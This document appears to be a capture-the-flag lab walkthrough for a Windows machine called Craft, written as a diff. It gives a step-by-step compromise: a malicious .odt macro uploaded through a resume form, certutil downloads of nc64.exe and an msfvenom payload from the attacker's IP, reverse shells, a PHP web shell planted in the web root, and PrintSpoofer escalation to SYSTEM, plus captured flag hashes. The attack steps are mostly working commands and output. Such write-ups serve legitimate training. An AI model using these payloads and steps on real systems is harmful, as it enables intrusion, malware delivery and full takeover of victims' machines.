@@ -1,0 +1,157 @@
+																			                        Craft Walkthrough
+																																							
+Attacker's Machine: 192.168.45.170
+Victim's Machine: 192.168.184.169
+export IP=192.168.184.169
+
+nmapAutomator.sh -H $IP -t Full
+
+80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
+|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+|_http-title: Craft
+
+Enumeration
+
+gobuster dir -u http://$IP:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 -b 404,302
+
+/uploads              (Status: 301) [Size: 344] [--> http://192.168.184.169/uploads/]
+/assets               (Status: 301) [Size: 343] [--> http://192.168.184.169/assets/]
+/css                  (Status: 301) [Size: 340] [--> http://192.168.184.169/css/]
+/js                   (Status: 301) [Size: 339] [--> http://192.168.184.169/js/]
+
+
+
+A file with the ".odt" extension is an OpenOffice Document file. These documents are typically created using programs like Apache OpenOffice Writer and LibreOffice Writer, word processors comparable to Microsoft Word and Google Docs. ODT files are similar to file formats created using Word, such as DOCX and DOC. They contain formatted text, images, links, and page information used for document creation and printing.
+
+# At first glance, the way to go it seems to be getting a reverse shell into an .odt file and either we can see it the uploads directory or it get's automatically executed (usually the case)
+   Let's install LibreOffice first and since we are dealing with .ODT files, we need LibreOffice Writer
+   
+apt-get install libreoffice 
+
+# Once you opened libreoffice writer, we need to create a new macro on it and we will make sure that our macro will run when the document is opened.
+
+
+
+
+
+# First let's check if we can get our macro to run after we've send our resume on their website.
+
+
+
+# Save the macro and the file and then assign the macro to run automatically when the document it's opened.
+   Go to Tools - Customize ...
+   
+   
+   
+   
+
+# Once we've configured the file, let's save the file, upload the file on the website while having a webserver running to see if we get a hit from our victim.
+
+
+
+# Ok, now that we've confirmed that our macro is being executed, let's add a new line into our macro in which we connect back using the nc binary that we've downloaded on the victims PC to connect back to our listener.
+   Place the nc binary into well know folders such as C:\Windows\Tasks or C:\Windows\system32\tasks
+
+
+
+# Upload the file and wait to see if we get a connection back on our listener
+
+Sub Main
+    Shell("cmd /c certutil.exe -urlcache -split -f http://192.168.45.170/nc64.exe C:\Windows\Tasks\nc64.exe")
+    Shell("cmd /c 'C:\Windows\Tasks\nc64.exe 192.168.45.170 4444 -e cmd.exe'")
+End Sub
+
+rlwrap nc -lvnp 4444
+
+
+
+# You can also use a msfvenom shell.exe payload or powershell script to get the reverse shell.
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.170 LPORT=4444 -f exe > shell.exe
+
+
+Sub Main
+    Shell("cmd /c certutil.exe -urlcache -split -f http://192.168.45.170/shell.exe C:\Windows\Tasks\shell.exe")
+    Shell("cmd /c C:\Windows\Tasks\shell.exe")
+End Sub
+
+# Nice, we got shell, let's grab ze flag and go for privilege escalation
+
+cd C:\Users\thecybergeek\Desktop
+more local.txt
+ac66d8ef3d3b8d600b3545a8ac54501e
+
+Privilege escalation
+
+# We did't get anything good through enumeration on the system, however, we notice that there's another account apache that we might need to get in order to escalate our privs to administrator.
+   Since we got nothing from the system, we know that the web application is running until the xampp folder on the system.
+   Let's place a PHP reverse shell in the root directory of the application and get a shell, the apache user might run the wep app.
+   
+https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php
+
+# Go to C:\xampp\htdocs and check if that is the root directory of the web application. Place the reverse shell in the application's root directory C:\xampp\htdocs and access it through the app.
+
+dir
+
+ Directory of C:\xampp\htdocs
+
+09/21/2023  05:51 AM    <DIR>          .
+09/21/2023  05:51 AM    <DIR>          ..
+07/13/2021  03:18 AM    <DIR>          assets
+07/13/2021  03:18 AM    <DIR>          css
+07/07/2021  10:53 AM             9,635 index.php
+07/13/2021  03:18 AM    <DIR>          js
+09/21/2023  05:51 AM             9,306 shell.php
+07/07/2021  09:56 AM               835 upload.php
+09/21/2023  05:23 AM    <DIR>          uploads
+
+certutil.exe -urlcache -split -f http://192.168.45.170/php_reverse_shell.php shell.php
+
+# Now access the file through the browser to get the shell.
+
+http://192.168.184.169/shell.php
+
+
+
+# Great, now we have moved laterally to get the user apache. Let's see which rights do we have
+
+whoami /all
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                              Description                                               State   
+============================= ========================================= ========
+SeTcbPrivilege                            Act as part of the operating system              Disabled
+SeChangeNotifyPrivilege              Bypass traverse checking                            Enabled 
+SeImpersonatePrivilege                Impersonate a client after authentication      Enabled 
+SeCreateGlobalPrivilege               Create global objects                                  Enabled 
+SeIncreaseWorkingSetPrivilege      Increase a process working set                   Disabled
+
+# Great, let's check again our build version.
+
+systeminfo
+
+OS Name:                   Microsoft Windows Server 2019 Standard
+OS Version:                10.0.17763 N/A Build 17763
+
+# Since this is a newer version, and we have Server 2019, let's go for the exploit PrintSpoofer64.exe
+   Download the binary from https://github.com/itm4n/PrintSpoofer/releases
+   Transfer on the victim and execute the command
+   
+certutil.exe -urlcache -split -f http://192.168.45.170/PrintSpoofer64.exe PrintSpoofer64.exe
+PrintSpoofer64.exe -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.17763.2029]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+whoami
+nt authority\system
+
+# Ok, we got administrator rights
+
+cd C:\Users\Administrator\Desktop
+more proof.txt
+e40927d85650650f173cff580f595adb
